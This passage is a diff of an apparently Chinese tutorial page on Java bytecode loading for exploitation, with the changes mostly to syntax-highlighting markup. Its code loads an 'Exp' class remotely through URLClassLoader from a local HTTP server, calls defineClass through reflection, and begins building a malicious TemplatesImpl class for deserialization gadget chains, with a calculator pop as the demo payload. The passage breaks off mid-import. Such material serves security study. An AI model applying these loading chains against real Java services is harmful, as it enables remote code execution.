-        URLClassLoader urlClassLoader = <span class="hljs-keyword">new</span> URLClassLoader(<span class="hljs-keyword">new</span> URL[]{<span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://127.0.0.1:8000/Exp.jar&quot;</span>)});
-        <span class="hljs-comment">// &#x4F1A;&#x52A0;&#x8F7D; http://127.0.0.1:8000/Exp.jar&#x4E2D;&#x7684;Exp.class</span>
-        Class&lt;?&gt; exp = urlClassLoader.loadClass(<span class="hljs-string">&quot;Exp&quot;</span>);
-        <span class="hljs-comment">// &#x89E6;&#x53D1;&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x5F39;&#x8BA1;&#x7B97;&#x5668;</span>
-        exp.newInstance();
-    }
-}
+<span class="token keyword">public</span> <span class="token keyword">class</span> loadClassFile <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span> <span class="token punctuation">{</span>
+        <span class="token class-name">URLClassLoader</span> urlClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> URL<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">&quot;http://127.0.0.1:8000/Exp.jar&quot;</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// &#x4F1A;&#x52A0;&#x8F7D; http://127.0.0.1:8000/Exp.jar&#x4E2D;&#x7684;Exp.class</span>
+        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> exp <span class="token operator">=</span> urlClassLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">&quot;Exp&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// &#x89E6;&#x53D1;&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x5F39;&#x8BA1;&#x7B97;&#x5668;</span>
+        exp<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 </code></pre>
 </li>
 <li><p>URL&#x4EE5;&#x659C;&#x6760;/&#x7ED3;&#x5C3E;&#xFF0C;&#x4E14;&#x534F;&#x8BAE;&#x540D;&#x662F; <code>file</code> &#xFF0C;&#x5219;&#x4F7F;&#x7528; <code>FileLoader</code> &#x6765;&#x5BFB;&#x627E;&#x7C7B;&#xFF0C;&#x5373;&#x4E3A;&#x5728;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#x5BFB;&#x627E;<code>.class</code>&#x6587;&#x4EF6;&#x3002;</p>
-<pre><code class="lang-java"><span class="hljs-keyword">import</span> java.net.MalformedURLException;
-<span class="hljs-keyword">import</span> java.net.URL;
-<span class="hljs-keyword">import</span> java.net.URLClassLoader;
+<pre class="language-"><code class="lang-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span><span class="token punctuation">;</span>
 
-<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">loadClassFile</span> </span>{
-    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException </span>{
-        URLClassLoader urlClassLoader = <span class="hljs-keyword">new</span> URLClassLoader(<span class="hljs-keyword">new</span> URL[]{<span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;file:/Users/d4m1ts/d4m1ts/java/classloader/&quot;</span>)});
-        <span class="hljs-comment">// &#x4F1A;&#x52A0;&#x8F7D; /Users/d4m1ts/d4m1ts/java/classloader/Exp.class</span>
-        Class&lt;?&gt; exp = urlClassLoader.loadClass(<span class="hljs-string">&quot;Exp&quot;</span>);
-        <span class="hljs-comment">// &#x89E6;&#x53D1;&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x5F39;&#x8BA1;&#x7B97;&#x5668;</span>
-        exp.newInstance();
-    }
-}
+<span class="token keyword">public</span> <span class="token keyword">class</span> loadClassFile <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span> <span class="token punctuation">{</span>
+        <span class="token class-name">URLClassLoader</span> urlClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> URL<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">&quot;file:/Users/d4m1ts/d4m1ts/java/classloader/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// &#x4F1A;&#x52A0;&#x8F7D; /Users/d4m1ts/d4m1ts/java/classloader/Exp.class</span>
+        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> exp <span class="token operator">=</span> urlClassLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">&quot;Exp&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// &#x89E6;&#x53D1;&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x5F39;&#x8BA1;&#x7B97;&#x5668;</span>
+        exp<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 </code></pre>
 </li>
 <li><p><strong>URL&#x4EE5;&#x659C;&#x6760;/&#x7ED3;&#x5C3E;&#xFF0C;&#x4E14;&#x534F;&#x8BAE;&#x540D;&#x4E0D;&#x662F; <code>file</code> &#xFF0C;&#x5219;&#x4F7F;&#x7528;&#x6700;&#x57FA;&#x7840;&#x7684; <code>Loader</code> &#x6765;&#x5BFB;&#x627E;&#x7C7B;<code>.class</code>&#x6587;&#x4EF6;&#x3002;</strong></p>
-<pre><code class="lang-java"><span class="hljs-keyword">import</span> java.net.MalformedURLException;
-<span class="hljs-keyword">import</span> java.net.URL;
-<span class="hljs-keyword">import</span> java.net.URLClassLoader;
+<pre class="language-"><code class="lang-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span><span class="token punctuation">;</span>
 
-<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">loadClassFile</span> </span>{
-    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException </span>{
-        URLClassLoader urlClassLoader = <span class="hljs-keyword">new</span> URLClassLoader(<span class="hljs-keyword">new</span> URL[]{<span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://127.0.0.1:8000/&quot;</span>)});
-        <span class="hljs-comment">// &#x4F1A;&#x52A0;&#x8F7D; http://127.0.0.1:8000/Exp.class</span>
-        Class&lt;?&gt; exp = urlClassLoader.loadClass(<span class="hljs-string">&quot;Exp&quot;</span>);
-        <span class="hljs-comment">// &#x89E6;&#x53D1;&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x5F39;&#x8BA1;&#x7B97;&#x5668;</span>
-        exp.newInstance();
-    }
-}
+<span class="token keyword">public</span> <span class="token keyword">class</span> loadClassFile <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">MalformedURLException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span> <span class="token punctuation">{</span>
+        <span class="token class-name">URLClassLoader</span> urlClassLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> URL<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">&quot;http://127.0.0.1:8000/&quot;</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// &#x4F1A;&#x52A0;&#x8F7D; http://127.0.0.1:8000/Exp.class</span>
+        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> exp <span class="token operator">=</span> urlClassLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">&quot;Exp&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// &#x89E6;&#x53D1;&#x6784;&#x9020;&#x51FD;&#x6570;&#xFF0C;&#x5F39;&#x8BA1;&#x7B97;&#x5668;</span>
+        exp<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 </code></pre>
 </li>
 </ol>
@@ -979,40 +1029,40 @@
 <blockquote>
 <p>&#x7531;&#x4E8E;<code>ClassLoader#defineClass</code>&#x65B9;&#x6CD5;&#x662F;<code>protected</code>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x65E0;&#x6CD5;&#x76F4;&#x63A5;&#x4ECE;&#x5916;&#x90E8;&#x8FDB;&#x884C;&#x8C03;&#x7528;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x501F;&#x52A9;&#x53CD;&#x5C04;&#x6765;&#x8C03;&#x7528;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;</p>
 </blockquote>
-<pre><code class="lang-java"><span class="hljs-keyword">import</span> java.io.IOException;
-<span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;
-<span class="hljs-keyword">import</span> java.lang.reflect.Method;
-<span class="hljs-keyword">import</span> java.nio.file.Files;
-<span class="hljs-keyword">import</span> java.nio.file.Paths;
+<pre class="language-"><code class="lang-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">InvocationTargetException</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span><span class="token punctuation">;</span>
 
-<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">loadClassFile</span> </span>{
+<span class="token keyword">public</span> <span class="token keyword">class</span> loadClassFile <span class="token punctuation">{</span>
 
-    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException </span>{
-        <span class="hljs-keyword">byte</span>[] classBytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;/Users/d4m1ts/d4m1ts/java/classloader/Exp.class&quot;</span>));
-        <span class="hljs-comment">// &#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8C03;&#x7528; defineClass</span>
-        Class&lt;ClassLoader&gt; clazz = ClassLoader.class;
-        Method defineClass = clazz.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class);
-        defineClass.setAccessible(<span class="hljs-keyword">true</span>);
-        Class exp = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Exp&quot;</span>, classBytes, <span class="hljs-number">0</span>, classBytes.length);
-        <span class="hljs-comment">// &#x9700;&#x8981;&#x624B;&#x52A8;&#x5B9E;&#x4F8B;&#x5316;&#x89E6;&#x53D1;&#x6784;&#x9020;&#x51FD;&#x6570;</span>
-        exp.newInstance();
-    }
-}
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span> <span class="token punctuation">{</span>
+        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classBytes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;/Users/d4m1ts/d4m1ts/java/classloader/Exp.class&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// &#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8C03;&#x7528; defineClass</span>
+        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">ClassLoader</span><span class="token punctuation">&gt;</span></span> clazz <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>
+        <span class="token class-name">Method</span> defineClass <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">&quot;defineClass&quot;</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        defineClass<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Class</span> exp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> defineClass<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;Exp&quot;</span><span class="token punctuation">,</span> classBytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> classBytes<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">// &#x9700;&#x8981;&#x624B;&#x52A8;&#x5B9E;&#x4F8B;&#x5316;&#x89E6;&#x53D1;&#x6784;&#x9020;&#x51FD;&#x6570;</span>
+        exp<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 </code></pre>
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027142250070.png" data-lightbox="13b4998f-3947-42ab-b90e-55c9efd5eae0" data-title="image-20211027142250070"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027142250070.png" alt="image-20211027142250070"></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027142250070.png" data-lightbox="7f75f9a2-4b4e-49a0-ab9f-99346e9ce1d2" data-title="image-20211027142250070"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027142250070.png" alt="image-20211027142250070"></a></p>
 <p>&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;<code>ClassLoader#defineClass</code>&#x8FD4;&#x56DE;&#x7684;&#x7C7B;&#x5E76;&#x4E0D;&#x4F1A;&#x521D;&#x59CB;&#x5316;&#xFF0C;&#x53EA;&#x6709;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#x663E;&#x5F0F;&#x5730;&#x8C03;&#x7528;&#x5176;&#x6784;&#x9020;&#x51FD;&#x6570;&#x521D;&#x59CB;&#x5316;&#x4EE3;&#x7801;&#x624D;&#x80FD;&#x88AB;&#x6267;&#x884C;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x60F3;&#x529E;&#x6CD5;&#x8C03;&#x7528;&#x8FD4;&#x56DE;&#x7684;&#x7C7B;&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;&#x624D;&#x80FD;&#x6267;&#x884C;&#x547D;&#x4EE4;&#x3002;</p>
 <p>&#x5728;&#x5B9E;&#x9645;&#x573A;&#x666F;&#x4E2D;&#xFF0C;&#x56E0;&#x4E3A;<code>defineClass</code>&#x65B9;&#x6CD5;&#x4F5C;&#x7528;&#x57DF;&#x662F;&#x4E0D;&#x5F00;&#x653E;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x653B;&#x51FB;&#x8005;&#x5F88;&#x5C11;&#x80FD;&#x76F4;&#x63A5;&#x5229;&#x7528;&#x5230;&#x5B83;&#xFF0C;&#x4F46;&#x5B83;&#x5374;&#x662F;&#x6211;&#x4EEC;&#x5E38;&#x7528;&#x7684;&#x4E00;&#x4E2A;&#x653B;&#x51FB;&#x94FE; <code>TemplatesImpl</code> &#x7684;&#x57FA;&#x77F3;&#x3002;</p>
 <h2 id="&#x5229;&#x7528;templatesimpl&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><a name="&#x5229;&#x7528;templatesimpl&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;" class="anchor-navigation-ex-anchor" href="#&#x5229;&#x7528;templatesimpl&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><i class="fa fa-link" aria-hidden="true"></i></a>2.3. &#x5229;&#x7528;TemplatesImpl&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</h2>
 <p>&#x5728;&#x591A;&#x4E2A;Java&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5229;&#x7528;&#x94FE;&#xFF0C;&#x4EE5;&#x53CA;fastjson&#x3001;jackson&#x7684;&#x6F0F;&#x6D1E;&#x4E2D;&#xFF0C;&#x90FD;&#x66FE;&#x51FA;&#x73B0;&#x8FC7; <code>TemplatesImpl</code> &#x7684;&#x8EAB;&#x5F71;&#x3002;&#x867D;&#x7136;&#x5927;&#x90E8;&#x5206;&#x4E0A;&#x5C42;&#x5F00;&#x53D1;&#x8005;&#x4E0D;&#x4F1A;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x5230;<code>defineClass</code>&#x65B9;&#x6CD5;&#xFF0C;&#x540C;&#x65F6;<code>java.lang.ClassLoader</code>&#x7684;<code>defineClass</code>&#x65B9;&#x6CD5;&#x4F5C;&#x7528;&#x57DF;&#x662F;&#x4E0D;&#x5F00;&#x653E;&#x7684;&#xFF08;<code>protected</code>&#xFF09;&#xFF0C;&#x5F88;&#x96BE;&#x5229;&#x7528;&#xFF0C;&#x4F46;&#x662F;Java&#x5E95;&#x5C42;&#x8FD8;&#x662F;&#x6709;&#x4E00;&#x4E9B;&#x7C7B;&#x7528;&#x5230;&#x4E86;&#x5B83;&#xFF0C;&#x8B6C;&#x5982;<code>TemplatesImpl</code></p>
 <p>&#x5728;<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>&#x7C7B;&#x4E2D;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;&#x5185;&#x90E8;&#x7C7B;&#xFF1A;<code>TransletClassLoader</code></p>
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027142849878.png" data-lightbox="3ef109e8-fcd4-41c9-8b58-346170f47dca" data-title="image-20211027142849878"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027142849878.png" alt="image-20211027142849878"></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027142849878.png" data-lightbox="7de2acb9-804c-40ed-93f2-4ee01f0e3b9e" data-title="image-20211027142849878"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027142849878.png" alt="image-20211027142849878"></a></p>
 <p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8FD9;&#x4E2A;&#x7C7B;&#x7EE7;&#x627F;&#x4E86;<code>ClassLoader</code>&#xFF0C;&#x800C;&#x4E14;&#x91CD;&#x5199;&#x4E86;<code>defineClass</code>&#x65B9;&#x6CD5;&#xFF0C;&#x5E76;&#x4E14;&#x6CA1;&#x6709;&#x663E;&#x5F0F;&#x5730;&#x5B9A;&#x4E49;&#x65B9;&#x6CD5;&#x7684;&#x4F5C;&#x7528;&#x57DF;&#x3002;</p>
 <blockquote>
 <p>Java&#x4E2D;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x65B9;&#x6CD5;&#x6CA1;&#x6709;&#x663E;&#x5F0F;&#x58F0;&#x660E;&#x4F5C;&#x7528;&#x57DF;&#xFF0C;&#x5176;&#x4F5C;&#x7528;&#x57DF;&#x4E3A;<code>default</code>&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;<strong>&#x8FD9;&#x91CC;&#x7684;<code>defineClass</code>&#x7531;&#x5176;&#x7236;&#x7C7B;&#x7684;<code>protected</code>&#x7C7B;&#x578B;&#x53D8;&#x6210;&#x4E86;&#x4E00;&#x4E2A;<code>default</code>&#x7C7B;&#x578B;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x53EF;&#x4EE5;&#x88AB;&#x540C;&#x4E00;&#x4E2A;&#x5305;&#x4E0B;&#x7684;&#x7C7B;&#x8C03;&#x7528;</strong>&#x3002;</p>
 </blockquote>
 <p>&#x7531;&#x4E8E;<code>TransletClassLoader</code>&#x662F;<code>default</code>&#x7684;&#x53EF;&#x4EE5;&#x88AB;&#x540C;&#x4E00;&#x4E2A;&#x5305;&#x4E0B;&#x7684;&#x7C7B;&#x8C03;&#x7528;&#xFF0C;&#x6240;&#x4EE5;&#x7531;&#x4E0B;&#x5411;&#x4E0A;&#x5BFB;&#x627E;&#x8FD9;&#x4E2A;<code>defineClass()</code>&#x5728;<code>TemplatesImpl</code>&#x4E2D;&#x7684;&#x8C03;&#x7528;&#x94FE;</p>
 <p>&#x4E00;&#x76F4;<code>Find Usages</code>&#xFF0C;&#x6700;&#x7EC8;&#x627E;&#x5230;&#x8C03;&#x7528;&#x94FE;&#x5982;&#x4E0B;&#xFF1A;</p>
-<pre><code>TemplatesImpl#getOutputProperties()
+<pre class="language-"><code>TemplatesImpl#getOutputProperties()
     TemplatesImpl#newTransformer()
         TemplatesImpl#getTransletInstance()
             TemplatesImpl#defineTransletClasses()
@@ -1026,123 +1076,123 @@
 </ul>
 <p>&#x6240;&#x4EE5;&#x4E00;&#x5171;&#x9700;&#x8981;&#x8BBE;&#x7F6E;3&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5206;&#x522B;&#x662F;<code>_bytecodes</code>&#x3001;<code>_name</code>&#x3001;<code>_tfactory</code></p>
 <p>&#x901A;&#x8FC7;&#x4E0B;&#x65B9;&#x5B9E;&#x4F8B;&#x5316;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#x8FDC;&#x7A0B;&#x52A0;&#x8F7D;&#x7684;&#x7C7B;&#x8FD8;&#x5FC5;&#x987B;&#x7EE7;&#x627F;<code>AbstractTranslet</code>&#x7C7B;</p>
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027155836709.png" data-lightbox="bf2dc626-9c8b-46c7-abc0-a22ad9b05ad7" data-title="image-20211027155836709"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027155836709.png" alt="image-20211027155836709"></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027155836709.png" data-lightbox="b259b076-11f9-4240-91b6-8e04716a71a3" data-title="image-20211027155836709"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027155836709.png" alt="image-20211027155836709"></a></p>
 <ul>
 <li>&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x7684;&#x6076;&#x610F;&#x7C7B;&#x4EE3;&#x7801;&#x4FEE;&#x6539;&#x5982;&#x4E0B;&#xFF1A;</li>
 </ul>
-<pre><code class="lang-java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;
-<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;
-<span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
-<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
-<span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+<pre class="language-"><code class="lang-java"><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span>DOM<span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span><span class="token punctuation">;</span>
